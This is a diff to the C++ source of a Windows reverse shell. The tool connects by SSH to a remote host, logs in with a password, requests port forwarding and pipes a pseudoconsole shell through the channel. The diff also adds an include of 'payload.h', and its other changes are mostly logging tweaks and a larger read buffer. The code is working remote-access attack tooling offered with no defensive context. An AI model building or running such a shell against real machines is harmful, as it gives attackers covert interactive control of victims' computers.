@@ -1,9 +1,5 @@
+#include "payload.h"
 #include "pseudoconsole.cpp"
-#include <libssh/libssh.h>
-#include <libssh/server.h>
-#include <stdexcept>
-#include <cassert>
-#include <iostream>
 #include <thread>
 
 class ReverseShell {
@@ -43,27 +39,26 @@ ReverseShell::~ReverseShell() {
 }
 
 void ReverseShell::printInternalErrors() {
-	std::cerr << "!! ssh internal error messages:\n";
+	std::cerr << "!! ssh internal error messages:" << std::endl;
 	if (session != nullptr) {
-		std::cout << "- session: " << ssh_get_error(session) << "\n";
+		std::cout << "- session: " << ssh_get_error(session) << std::endl;
 	}
 	if (channel != nullptr) {
-		std::cout << "- channel: " << ssh_get_error(channel) << "\n";
+		std::cout << "- channel: " << ssh_get_error(channel) << std::endl;
 	}
 }
 
 void readShell(PTY *pty, ssh_channel *channel) {
-	const DWORD bufferSize = 5;
+	const DWORD bufferSize = 512;
 	char buffer[bufferSize];
 
 	while ( ssh_channel_is_open(*channel) ) {
-		memset(buffer, 0, bufferSize);
 		DWORD bytesRead;
 		auto readSuccess = ReadFile(pty->outputReadSide, buffer, bufferSize, &bytesRead, NULL);
 		if (!readSuccess) {
 			auto err = GetLastError();
 			if (err != ERROR_HANDLE_EOF) {
-				std::cerr << "read shell: " << err << "\n";
+				std::cerr << "read shell: " << err << std::endl;
 			}
 			break;
 		}
@@ -90,70 +85,69 @@ void readClient(PTY *pty, ssh_channel *channel) {
 	while ( ssh_channel_is_open(*channel) ) {
 		auto bytesRead = ssh_channel_read(*channel, buffer, bufferSize, false);
 		if (bytesRead == 0) {
-			std::cerr << "hit eof\n";
-			// hit eof, just exit
+			std::cerr << "hit eof" << std::endl;
 			break;
 		}
 		if (bytesRead <= 0) {
-			std::cout << "code: " << bytesRead << "\n";
+			std::cout << "code: " << bytesRead << std::endl;
 			break;
 		}
 
 		DWORD bytesWritten;
 		auto writeSuccess = WriteFile(pty->inputWriteSide, buffer, bytesRead, &bytesWritten, NULL);
 		if (!writeSuccess) {
-			std::cerr << "writing client->shell: " << GetLastError() << "\n";
-			std::cerr << "bytes written: " << bytesWritten << "\n";
+			std::cerr << "writing client->shell: " << GetLastError() << std::endl;
+			std::cerr << "bytes written: " << bytesWritten << std::endl;
 			break;
 		}
 	}
 
-	std::cerr << "client exit\n";
+	std::cerr << "client exit" << std::endl;
 	ssh_channel_close(*channel);
 	pty->close();
 }
 
 void ReverseShell::Connect(int port, const char *password) {
-	std::cout << "connecting.." << "\n";
+	std::cout << "connecting.." << std::endl;
 	if (ssh_connect(session)) {
-		std::cerr << ssh_get_error(session) << "\n";
+		std::cerr << ssh_get_error(session) << std::endl;
 		throw std::runtime_error("connecting");
 	}
 
 	// TODO: properly authenticate the server
 	if (ssh_session_update_known_hosts(session)) {
-		std::cerr << ssh_get_error(session) << "\n";
+		std::cerr << ssh_get_error(session) << std::endl;
 		throw std::runtime_error("updating known hosts");
 	}
 
-	std::cout << "authenticating.." << "\n";
+	std::cout << "authenticating.." << std::endl;
 	auto authStatus = ssh_userauth_password(session, NULL, password);
 	if (authStatus) {
-		std::cerr << "auth status: " << authStatus << "\n";
-		std::cerr << ssh_get_error(session) << "\n";
+		std::cerr << "auth status: " << authStatus << std::endl;
+		std::cerr << ssh_get_error(session) << std::endl;
 		throw std::runtime_error("authenticating");
 	}
 
-	std::cout << "sending forwarding request.." << "\n";
+	std::cout << "sending forwarding request.." << std::endl;
 	if (ssh_channel_listen_forward(session, NULL, port, NULL)) {
-		std::cerr << ssh_get_error(session) << "\n";
+		std::cerr << ssh_get_error(session) << std::endl;
 		throw std::runtime_error("forwarding request");
 	}
 
 	char *originator;
 	int originatorPort;
-	std::cout << "waiting channel open.." << "\n";
+	std::cout << "waiting channel open.." << std::endl;
 	channel = ssh_channel_open_forward_port(session, 100000, NULL, &originator, &originatorPort);
 	if (channel == NULL) {
-		std::cerr << ssh_get_error(session) << "\n";
+		std::cerr << ssh_get_error(session) << std::endl;
 		throw std::runtime_error("channel open request");
 	}
 
-	std::cout << "- originator: " << originator << "\n";
-	std::cout << "- originatorPort: " << originatorPort << "\n";
+	std::cout << "- originator: " << originator << std::endl;
+	std::cout << "- originatorPort: " << originatorPort << std::endl;
 	ssh_string_free_char(originator);
 
-	std::cout << "channel open: " << ssh_channel_is_open(channel) << "\n";
+	std::cout << "channel open: " << ssh_channel_is_open(channel) << std::endl;
 
 	PTY pty;
 	auto result = pty.createPseudoConsole();
